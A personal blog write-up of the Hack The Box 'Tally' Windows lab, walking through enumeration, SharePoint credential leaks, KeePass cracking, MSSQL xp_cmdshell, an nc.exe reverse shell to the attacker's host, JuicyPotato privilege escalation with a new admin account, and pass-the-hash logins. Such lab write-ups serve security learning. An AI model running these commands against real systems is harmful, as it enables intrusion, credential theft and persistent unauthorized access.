---
layout: post
title:  "Tally Writeup - Hack The Box"
date:   2025-03-09
desc: ""
keywords: "HTB,OSCP,Windows,SharePoint,InformationLeakage,Keepass,MSSQL,SeImpersonatePrivilege,Hard"
categories: [HTB]
tags: [HTB,OSCP,Windows,SharePoint,InformationLeakage,Keepass,MSSQL,SeImpersonatePrivilege,Hard]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/tally_writeup/Tally.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

Keep practicing and practicing, day after day can cause you to end up **burned out**, so you should rest between one machine and another. In these rest periods is where all the concepts begin to assimilate and not so much in the **Engagement** of the machine, which is when one is only looking for the objective, first to find the attack vector and then the engagement. The **Tally** machine was very extensive and I made a <ins>lot of mistakes</ins> in the process of completing it, and I think that is why it is rated as **Hard**. I spawn the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** 
lab box and start another challenge again.

<br /><br />
<img src="{{ site.img_path }}/tally_writeup/Tally_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I corroborate with `ping` that I already have connectivity with the target (**[Hack The Box](https://www.hackthebox.com){:target="_blank"}** very quickly deploys the lab once I spawn the box). With `nmap` I leak the ports that are exposed to the **Internet** and that are going to be my door to the machine, or maybe not, since I'm only focusing on those that use **TCP** protocol (for the moment), and not **UDP**. I get a lot of important information about services and versions. If I try to authenticate with the user **anonymous** with `ftp`, I am not allowed, then I go to the web services, and with tools like `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I leak the technologies that the developers used, maybe the versions have vulnerabilities or may be leaking information that can be very helpful to an attacker.

```bash
ping -c 2 10.129.1.183
whichSystem.py 10.129.1.183
sudo nmap -sS --min-rate 5000-p- --open -vvv -n -Pn 10.129.1.183 -oG allPorts
nmap -sCV -p21,80,81,135,139,445,808,1433,5985 10.129.1.183 -oN targeted
cat targeted
#    --> Microsoft IIS httpd 10.0
#    --> Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
#    --> Microsoft SQL Server 2016 13.00.1601.00; RTM

ftp 10.129.1.183
whatweb http://10.129.1.183 http://10.129.1.183:81
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `rpcclient`, `smbclient`, `smbmap` y `crackmapexec` I perform an enumeration on the services that use the **RPC** and **SMB** protocols respectively, but I need valid credentials and as I just started my **Reconnaissance** phase I did not collect much information yet.

> **RPC** stands for **Remote Procedure Call**, a protocol that allows a program to run a function on a different computer. It's a way to build distributed systems and is often used to call remote functions on a server.

```bash
rpcclient -U "" 10.129.1.183
smbclient -L 10.129.1.183 -N
smbmap -H 10.129.1.183 -u 'null' --no-banner
crackmapexec smb 10.129.1.183 2>/dev/null
# Windows Server 2016 Standard 14393 x64

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=Tally -sV -p 1433 10.129.1.183
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The web service on port 80, is not the typical one I always encounter when there is an IIS implemented. It corresponds to the Microsoft Sharepoint web platform, and as I always do when I find myself in front of a technology that I do not know is to investigate on the Internet ways to enumerate them, the first thing I find is **[SharePoint user enumeration](https://www.acunetix.com/vulnerabilities/web/sharepoint-user-enumeration/){:target="_blank"}** and an article by **[Giorgio Fedon](https://mindedsecurity.com/wp-content/uploads/2020/10/Fedon_Athcon_June11.pdf){:target="_blank"}** that give me some very interesting routes to filter information. Unfortunately the most important of the paths does not exist, but the _layout folder, although I do not have permissions to access, does exist.

> Organizations use **[Microsoft SharePoint](https://support.microsoft.com/en-us/office/what-is-sharepoint-97b915e6-651b-43b2-827d-fb25777f446f){:target="_blank"}** to create websites. You can use it as a secure place to **store**, **organize**, **share**, and **access information** from any device. All you need is a web browser, such as Microsoft Edge, Chrome, or Firefox.

```html
# http://10.129.1.183/_layouts/15/start.aspx#/default.aspx
# http://10.129.1.183/_layouts/15/help.aspx?Lcid=1033&Key=HelpHome&ShowNav=true

# Exposed Web Services
# http://10.129.1.183/_vti_bin/spdisco.aspx             # :)
# http://10.129.1.183/_layouts/viewlists.aspx           # :(
# http://10.129.1.183/_layouts/                         # :)
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I list with `wfuzz` I have no result, this probably because **I am not using the right dictionary**, but I will look for more information without saturating both the server. Now I continue researching on the **Internet**, there are many resources and thanks to the **[Hack4u](https://hack4u.io/){:target="_blank"}** community, they share with me the link to the resource **[Best Practices for Security in Microsoft SharePoint 2013](https://www.slideshare.net/slideshow/best-practices-for-security-in-microsoft-sharepoint-2013/21220242){:target="_blank"}** in which I find new routes and after searching for a while and trying each one, I find one that redirects me to a page with various shared resources.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.1.183/_layouts/FUZZ

# http://10.129.1.183/_layouts/15/viewlsts.aspx         # :)
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In one of the shared folders I find a file with credentials (I download the file and open it with `libreoffice`), and the only service I can test them on is **FTP**, but no username with login works. I keep seeing the shared resources through **SharePoint** and there is another folder with an item, but when I open it I have to have all five senses open, because it is producing an error in the redirection, so after correcting it I can access the resource.

```bash
libreoffice &>/dev/null &

ftp 10.129.1.183
# anonymous, admin, administrator, local      :(

# http://10.129.1.183/SitePages/Forms/AllPages.aspx
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In the new share, there is a message leaking the credentials to connect via **FTP** to the target machine. With `ftp` I connect with the credentials and can access a lot of information, which if I try to enumerate with the session established with `ftp` would take me a long time. There is the **[`curlftps`](https://www.looklinux.com/mount-ftp-share-on-linux-using-curlftps/){:target="_blank"}** tool that allows me to **[create a mount](https://linuxconfig.org/mount-remote-ftp-directory-host-locally-into-linux-filesystem){:target="_blank"}** with all the shared resources. Once the files and folders are already accessible, I can enumerate faster and more efficiently, the most important thing I find is a **[Keepass](https://keepass.info/){:target="_blank"}** database.

> **[KeePass](https://keepass.info/){:target="_blank"}** is a free open source password manager, which helps you to manage your passwords in a secure way. You can store all your passwords in one database, which is locked with a master key. So you only have to remember one single master key to unlock the whole database. Database files are encrypted using the best and most secure encryption algorithms currently known (**AES-256**, **ChaCha20** and **Twofish**).

```bash
# http://10.129.1.183/SitePages/FinanceTeam.aspx

ftp 10.129.1.183
# ftp_user ....
  dir
# :) So many folders!!!

sudo apt install curlftpfs
mkdir /mnt/ftp_server
curlftpfs 'ftp_user:UT....ys@10.129.1.183' /mnt/ftp_server
cd /mnt/ftp_server
cd User
tree -fas
# ./Tim/Files/tim.kdbx
# ./Tim/Project/Log/do to.txt
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To **[access the passwords stored in the leaked database](https://www.reddit.com/r/KeePass/comments/10trb8o/opening_kbdx_file_with_keepassxc_from_a_linux/){:target="_blank"}** (**tim.kdbx**), I need to install `keepasxc`, but if I try to open it I can't because it is password protected, for this problem I have the tool `keepass2jhon` to extract the hash and then perform a brute force attack with `hashcat`, unfortunately I can't get it to work correctly with this hash, so I will use another tool.

> **KDBX** is the **KeePass 2.x database** file format, which is used for storing user data (user names, passwords, URLs, etc.). It features encryption, data authentication (for detecting corruptions/manipulations), compression, attachment deduplication and extensibility (plugins and ports can store custom data).

```bash
cp ./Tim/Files/tim.kdbx /home/al3j0/Documents/HackTheBox/Windows/Tally/content
umount /mnt/ftp_server
rmdir /mnt/ftp_server

which keepassxc
sudo apt search KeePassXC
sudo apt install keepassxc

keepassxc tim.kdbx

which keepass2john
keepass2john tim.kdbx > hash
hashcat --example-hashes | grep keepass
hashcat --example-hashes | grep keepass -A 15
hashcat -a 0 -m 29700 --username hash /usr/share/wordlists/rockyou.txt
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `john` now if I can perform the attack and get the password, before accessing the **KeePass** database, I check with `crackmapexec`, `rpcclient`, `smbclient` if they serve me to authenticate (many times it has worked) **but not**. The password allows me to obtain the credentials of a new user. There is also the `kpcli` tool (recommended by **[0xdf](https://0xdf.gitlab.io/){:target="_blank"}**), which allows to access the database from console in a very fast way.

```bash
john -w=$(locate rockyou.txt)
john -w=/usr/share/wordlists/rockyou.txt hash

crackmapexec smb 10.129.1.183 -u 'tim' -p 'simplementeyo' 2>/dev/null
rpcclient -U "tim" 10.129.1.183
smbclient -L 10.129.1.183 -U 'tim'
smbclient -L 10.129.1.183 -U 'tim%simplementeyo'
# :(

sudo apt search kpcli
sudo apt install kpcli
kpcli --help
kpcli --kdb=tim.kdbx
  help
# find -- Finds entries by Title
# show -- Show an entry: show [-f] [-a] <entry path|entry number>
  help find
  find            # :(
  find .
  show -f 0
  show -f 1
  show -f 2       # :)
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have new credentials, I go back to `crackmapexec` to validate them, and yes, the user exists but I still can't engage the box. With `rpcclient` I can't enumerate via **RPC** protocol, but with `smbclient` I can access a new shared folder (**ACCT**), and also there are many resources so with `mount` I will create a mount to access from my attacking machine (I must also have `cifs-utils` installed for the management of shared resources via **SMB**). After a long enumeration I find many files, some interesting and others not so much, but I find a folder with a list of binaries and one with a very particular name - **tester.exe** - that I am going to copy to my machine to analyze it more in depth.

```bash
crackmapexec smb 10.129.1.183 -u 'Finance' -p 'Acc0unting' 2>/dev/null
crackmapexec winrm 10.129.1.183 -u 'Finance' -p 'Acc0unting' 2>/dev/null        # :(
rpcclient -U "Finance" 10.129.1.183
  enumdomusers
  enumdomgroups
# :(

smbclient -L 10.129.1.183 -U 'Finance'
# ACCT
smbclient //10.129.1.183/ACCT -U "Finance"
  dir         # Much information!

apt install cifs-utils
mount -t cifs //10.129.1.183/ACCT /mnt/smb_tally -o username=Finance,password=Acc0unting,domain=WORKGROUP,rw
pushd /mnt/smb_tally
tree -fas
# ./zz_Archived/SQL/conn-info.txt
# ./zz_Migration/Binaries/New\ folder/tester.exe
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `radare2` I can analyze the code well in depth (**assembly code**), and in the **`main`** function I find the **MSSQL** credentials. A shorter way to get the same information, is to use `strings` but in many cases one must handle **regex** well (for this particular case, no). Once I can access with `mssqlclient.py` I can resort to **HackTricks** to **[enumerate and even enable the xp_cmdshell function to execute commands remotely](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?highlight=port%201433#hacktricks-automatic-commands){:target="_blank"}**.

```bash
cp ./zz_Migration/Binaries/New\ folder/tester.exe /home/al3j0/Documents/HackTheBox/Windows/Tally/content
cd !$
file tester.exe
# PE32 executable (console) Intel 80386
radare2 tester.exe
  aaa
  s main
  pdf
# DATABASE=orcharddb;UID=sa;PWD=G.....G;

strings tester.exe | grep "PWD"
strings tester.exe | grep "PWD" | tr ';' '\n'

mssqlclient.py WORKGROUP/sa@10.129.1.183
  select @@version;
  select user_name();
  SELECT name FROM master.dbo.sysdatabases;
# RCE ?
  EXEC master..xp_cmdshell 'whoami'         # :(
  EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC master..xp_cmdshell 'whoami'         # :)
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have an **RCE**, I just need to use `nc.exe` to get a **Reverse Shell**, first I will set up a server to share resources via **SMB**, with `impacket-smbserver` and I can run the command in the session I have established with `mssqlclient.py`. Once I succeed in engaging the box, I can already see the content of the first flag, in the process of enumerating the system I find a message for **tim**, which gives me a hint to be able to **Escalate Privileges**. And if I see the privileges that I have, my suspicions are confirmed, I have enabled the **SeImpersonatePrivilege**, so maybe I can already escalate privileges to the user with maximum privileges.

> **Attacker Machine**:

```bash
locate nc.exe | grep usr
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
sudo impacket-smbserver smbFolder $(pwd) -smb2support
sudo rlwrap -cAr nc -nlvp 443

  EXEC master..xp_cmdshell '\\10.10.14.84\smbFolder\nc.exe -e cmd 10.10.14.84 443'      # :)
```

> **Victime Machine**:

```cmd
type todo.txt
type "note to tim (draft).txt"
# ...disallowed any cmd.exe outside the Windows folder from executing...
whoami /priv
# SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
whoami /all
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To escalate privileges I need the `JuicyPotato.exe` binary from **ohpe**, which is available on their **[Github](https://github.com/ohpe/juicy-potato){:target="_blank"}**. I download it and then transfer it to the target machine, I run the binary and it works correctly, now that I know a little bit one of the methods to escalate I perform the first step which is to **create a new account**, but it does not work because my password does not comply with the security policies. Once I correct this error I see with `net` that the account was created successfully.

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/JuicyPotato.exe ./JP.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
.\JP.exe
.\JP.Exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user oldb0y oldb0y123 /add"
net user
# ??        Week password?

.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user oldboy oldb0y123!$ /add"
net user
# :)
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once the account is created, I continue with the following steps. I must add the newly created account to the **Administrators group**, then create a share folder with **Full privileges** for the **local Administrators group** and finally modify a policy in the **Windows Registry**. I check with `net` that everything has worked correctly and the account belongs to the **Administrators group** and I have <ins>successfully escalated privileges</ins>. Now from my attacker machine I can perform a last validation with `crackmapexec` that the machine was **Pwn3d** and with tools like `evil-winrm`, `impacket-wmiexec`, `impacket-psexec` access the box as a user with maximum privileges and see the content of the last flag.

> **Victime Machine**:

```cmd
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators oldboy /add"
.\JP.Exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp GRANT:Administrators,FULL"
.\JP.Exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
net user
# Local Group Memberships      *Administrators
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.129.1.183 -u 'oldboy' -p 'oldb0y123!$' 2>/dev/null
crackmapexec winrm 10.129.1.183 -u 'oldboy' -p 'oldb0y123!$' 2>/dev/null
evil-winrm -i 10.129.1.183 -u 'oldboy' -p 'oldb0y123!$'
# :)

crackmapexec smb 10.129.1.183 -u 'oldboy' -p 'oldb0y123!$' --sam 2>/dev/null
evil-winrm -i 10.129.1.183 -u 'Administrator' -H 'd90.....b2'

impacket-wmiexec administrator@10.129.1.183 -hashes :d90.....b2

impacket-psexec WORKGROUP/Administrator@10.129.1.183 -hashes :d90....b2
```

<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/tally_writeup/Tally_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> What an amazing trip with **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, I had to do some research and remember some methods **I haven't used in a while**. It was a box that took me a long time due to the various steps I had to do, I also made several mistakes in the commands I entered, it's always like that with me, a lot of try and error but finally I finished the lab and I'm already thinking about the next one. I don't forget to kill the box and continue on my way.

<br /><br />
<img src="{{ site.img_path }}/tally_writeup/Tally_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
